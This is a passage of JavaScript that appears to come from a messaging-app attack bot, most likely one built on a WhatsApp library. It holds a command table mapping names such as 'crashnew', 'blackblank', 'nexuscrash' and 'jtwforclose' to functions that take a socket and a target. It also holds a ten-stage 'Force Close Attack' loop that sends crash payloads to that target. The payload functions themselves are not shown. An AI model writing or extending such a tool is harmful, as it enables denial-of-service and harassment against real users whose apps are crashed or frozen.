            await JtwForcloseX(sock, target);
            console.log(chalk.green(`  - Stage ${i + 1}/10 sent`));
            await sleep(1000);
        }
        console.log(chalk.blue.bold(`[Force-Close] Force Close Attack completed.`));
    },
    "callinvisible": (sock, target) => callinvisible(sock, target),
    "crashnew": (sock, target) => crashnew(sock, target),
    "blackblank": (sock, target) => BlackBlankTotal(sock, target),
    "xprotex": (sock, target) => XProtexBlankChatV3(sock, target),
    "jtwstuck": (sock, target) => JtwStuck(sock, target),
    "nexuscrash": (sock, target) => NexusChatAiCrash(sock, target),
    "empire": (sock, target) => EmpireUltimate(sock, target),
    "skyforce": (sock, target) => SkyForce(sock, target),
    "documorsh": (sock, target) => DocuMorsh01(sock, target),
    "jtwforclose": (sock, target) => JtwForcloseX(sock, target)
};
